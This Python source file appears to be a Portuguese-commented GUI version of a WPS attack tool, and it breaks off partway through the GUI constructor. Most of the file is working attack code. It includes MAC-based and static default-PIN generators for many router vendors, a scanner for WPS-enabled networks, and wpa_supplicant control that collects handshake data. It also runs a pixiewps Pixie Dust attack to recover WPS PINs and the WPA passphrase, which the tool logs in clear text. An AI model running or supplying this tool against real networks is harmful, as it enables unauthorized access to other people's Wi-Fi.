#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WPS Attack Pin Tool

"""

import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
import csv
import json
import threading
import queue
from datetime import datetime
from pathlib import Path
from typing import Dict, Optional, List, Tuple
from collections import deque
import statistics
import wcwidth

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog

# ============================================================
# CLASSES ORIGINAIS (adaptadas para callback em vez de print)
# ============================================================

class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other

    def __isub__(self, other):
        self.integer -= other

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)


class WPSpin:
    """WPS pin generator"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {
            'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
            'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
            'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
            'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
            'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
            'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
            'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
            'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
            'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
            'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
            'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
            'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
            'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
            'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
            'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
            'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
            'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
            'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
            'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
            'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
            'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
            'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
            'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
            'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
            'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
            'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
            'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
            'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
            'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
            'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}
        }

    @staticmethod
    def checksum(pin):
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getAll(self, mac, get_static=True):
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getList(self, mac, get_static=True):
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            res.append(self.generate(ID, mac))
        return res

    def getSuggested(self, mac):
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        else:
            return None

    def _suggest(self, mac):
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)
        return res

    def pin24(self, mac):
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pinDLink(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin


class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
                    self.pke, self.pkr, self.e_hash1,
                    self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd


class ConnectionStatus:
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class Companion:
    """Main engine com callbacks para GUI"""
    def __init__(self, interface, callback_log=None, bssid=''):
        self.interface = interface
        self.callback_log = callback_log
        self._running = True

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)

        self.generator = WPSpin()
        self.bssid = bssid
        self.lastPwr = 0

    def stop(self):
        self._running = False

    def log(self, msg, level='i'):
        if self.callback_log:
            self.callback_log(msg, level)

    def __init_wpa_supplicant(self):
        self.log('Iniciando wpa_supplicant...')
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        while self._running:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise ValueError('wpa_supplicant retornou erro: ' + self.wpas.communicate()[0])
            if os.path.exists(self.wpas_ctrl_path):
                break
            time.sleep(.1)

    def sendOnly(self, command):
        if not self._running:
            return
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        if not self._running:
            return ''
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    @staticmethod
    def _explain_wpas_not_ok_status(command, respond):
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('wpa_supplicant compilado sem suporte WPS. '
                        'Recompile com CONFIG_WPS=y.')
        return 'Erro inesperado do wpa_supplicant'

    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=True, bssid=""):
        if not self._running:
            return False
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            self.log(line, 'd')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                self.log('Enviando WPS Message M{}...'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                self.log('Recebido WPS Message M{}'.format(n))
                if n == 5:
                    self.log('Primeira metade do PIN é válida', 's')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                self.log('WSC NACK recebido - PIN errado', 'e')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                if pixiemode:
                    self.log('E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                if pixiemode:
                    self.log('PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                if pixiemode:
                    self.log('PKE: {}'.format(self.pixie_creds.pke))
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                if pixiemode:
                    self.log('AuthKey: {}'.format(self.pixie_creds.authkey))
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                if pixiemode:
                    self.log('E-Hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                if pixiemode:
                    self.log('E-Hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                self.log('Escaneando...')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            self.log('wpa_supplicant retornou WPS-FAIL', 'e')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self.log('Autenticando...')
        elif 'Authentication response' in line:
            self.log('Autenticado')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self.log('Associando com o AP...')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                self.log('Associado com {} (ESSID: {})'.format(bssid, self.connection_status.essid), 's')
            else:
                self.log('Associado com {}'.format(bssid), 's')
            self.connection_status.status = 'associated'
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            self.log('Enviando EAPOL Start...')
        elif 'EAP entering state IDENTITY' in line:
            self.log('Recebido Identity Request')
        elif 'using real identity' in line:
            self.log('Enviando Identity Response...')
        elif self.bssid in line and 'level=' in line:
            self.lastPwr = line.split("level=")[1].split(" ")[0]
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            self.log('AP selecionado: {}'.format(bssid))
        elif bssid in line and 'level=' in line:
            signal = line.split("level=")[1].split(" ")[0]
            if 'noise=' in line:
                noise = line.split("noise=")[1].split(" ")[0]
                self.log('Sinal: {}, Ruído: {}'.format(signal, noise))
            else:
                self.log('Sinal: {}'.format(signal))

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        self.log('Executando Pixiewps...')
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            self.log(cmd)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                           stderr=sys.stdout, encoding='utf-8', errors='replace')
        self.log(r.stdout)
        if r.returncode == 0:
            lines = r.stdout.splitlines()
            for line in lines:
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()
                    if pin == '<empty>':
                        pin = "''"
                    return pin
        return False

    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=True):
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)

        if pbc_mode:
            if bssid:
                self.log("Conectando via WPS PBC em {}...".format(bssid))
                cmd = 'WPS_PBC {}'.format(bssid)
            else:
                self.log("Conectando via WPS PBC...")
                cmd = 'WPS_PBC'
        else:
            self.log("Testando PIN '{}'...".format(pin))
            cmd = 'WPS_REG {} {}'.format(bssid, pin)

        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            self.log(self._explain_wpas_not_ok_status(cmd, r), 'e')
            return False

        while self._running:
            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=bssid.lower())
            if not res:
                break
            if self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                break

        self.sendOnly('WPS_CANCEL')
        return False

    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False,
                          showpixiecmd=False, pixieforce=False):
        if not pin:
            if pixiemode:
                try:
                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                    with open(filename, 'r') as file:
                        t_pin = file.readline().strip()
                        self.log('PIN calculado anteriormente encontrado: {}'.format(t_pin))
                        pin = t_pin
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                self.log('Nenhum PIN especificado, usando PIN provável')
                pin = self.generator.getLikely(bssid) or '12345670'

        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=pbc_mode)
            bssid = getattr(self.connection_status, 'bssid', bssid)
            pin = '<PBC mode>'
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            result = {
                'pin': pin,
                'psk': self.connection_status.wpa_psk,
                'essid': self.connection_status.essid,
                'bssid': bssid
            }
            self.log('WPS PIN: {}'.format(pin), 's')
            self.log('WPA PSK SENHA: {}'.format(self.connection_status.wpa_psk), 's')
            self.log('SSID: {}'.format(self.connection_status.essid), 's')
            return result
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if pin:
                    self.log('PIN calculado pelo Pixiewps: {}'.format(pin), 's')
                    return self.single_connection(bssid, pin, pixiemode=False, showpixiecmd=showpixiecmd, pixieforce=pixieforce)
                return None
            else:
                self.log('Dados insuficientes para ataque Pixie Dust', 'e')
                return None
        else:
            return None

    def generate_pins_list(self, bssid):
        return self.generator.getSuggested(bssid)

    def cleanup(self):
        try:
            self._running = False
            self.retsock.close()
            self.wpas.terminate()
            os.remove(self.res_socket_file)
            shutil.rmtree(self.tempdir, ignore_errors=True)
            os.remove(self.tempconf)
        except:
            pass

    def __del__(self):
        try:
            self.cleanup()
        except:
            pass


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


# ============================================================
# SCANNER (adaptado para callback)
# ============================================================

class WiFiScanner:
    def __init__(self, interface, vuln_list=None, callback_log=None):
        self.interface = interface
        self.vuln_list = vuln_list or []
        self.callback_log = callback_log

    def log(self, msg, level='i'):
        if self.callback_log:
            self.callback_log(msg, level)

    def iw_scanner(self):
        cmd = 'iw dev {} scan'.format(self.interface)
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        
        for line in lines:
            if line.startswith('command failed:'):
                self.log('Erro iw: {}'.format(line), 'e')
                return []
            line = line.strip('\t')
            
            m = re.match(r'BSS (\S+)( )?\(on \w+\)', line)
            if m:
                networks.append({
                    'BSSID': m.group(1).upper(),
                    'Security type': 'Unknown', 'WPS': False,
                    'WPS locked': False, 'Model': '',
                    'Model number': '', 'Device name': '',
                    'ESSID': '', 'Level': 0
                })
                continue
            
            if not networks:
                continue
                
            net = networks[-1]
            
            m = re.match(r'SSID: (.*)', line)
            if m:
                net['ESSID'] = codecs.decode(m.group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
                continue
                
            m = re.match(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm', line)
            if m:
                net['Level'] = int(float(m.group(1)))
                continue
                
            m = re.match(r'(capability): (.+)', line)
            if m:
                if 'Privacy' in m.group(2):
                    net['Security type'] = 'WEP'
                else:
                    net['Security type'] = 'Open'
                continue
                
            m = re.match(r'(RSN):\t [*] Version: (\d+)', line)
            if m:
                if net['Security type'] == 'WEP':
                    net['Security type'] = 'WPA2'
                elif net['Security type'] == 'WPA':
                    net['Security type'] = 'WPA/WPA2'
                elif net['Security type'] == 'Open':
                    net['Security type'] = 'WPA2'
                continue
                
            m = re.match(r'(WPA):\t [*] Version: (\d+)', line)
            if m:
                if net['Security type'] == 'WEP':
                    net['Security type'] = 'WPA'
                elif net['Security type'] == 'WPA2':
                    net['Security type'] = 'WPA/WPA2'
                elif net['Security type'] == 'Open':
                    net['Security type'] = 'WPA'
                continue
                
            m = re.match(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)', line)
            if m:
                net['WPS'] = True
                continue
                
            m = re.match(r' [*] AP setup locked: (0x[0-9]+)', line)
            if m:
                net['WPS locked'] = int(m.group(1), 16) != 0
                continue
                
            m = re.match(r' [*] Model: (.*)', line)
            if m:
                net['Model'] = m.group(1)
                continue
                
            m = re.match(r' [*] Model Number: (.*)', line)
            if m:
                net['Model number'] = m.group(1)
                continue
                
            m = re.match(r' [*] Device name: (.*)', line)
            if m:
                net['Device name'] = m.group(1)
                continue

        networks = [n for n in networks if n['WPS']]
        networks.sort(key=lambda x: x['Level'], reverse=True)
        return networks


# ============================================================
# INTERFACE GRÁFICA
# ============================================================

class OneShotGUI:
    def __init__(self, root):
        self.root = root
        self.root.title('WPS Attack Pin Tool')
        self.root.geometry('1000x750')
        self.root.minsize(800, 600)

        # Estado
        self.companion = None
        self.scanner = None
        self.attack_thread = None
        self.scan_thread = None
        self._running = False
        self.networks_list = []
        self.selected_bssid = None
        self.generator = WPSpin()
        
        # Wordlist pins
        self.wordlist_pins = []
        self.wordlist_index = 0

        # Diretórios
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)

        # Variáveis de controle
        self.var_interface = tk.StringVar(value='wlan0')
        self.var_pin = tk.StringVar()
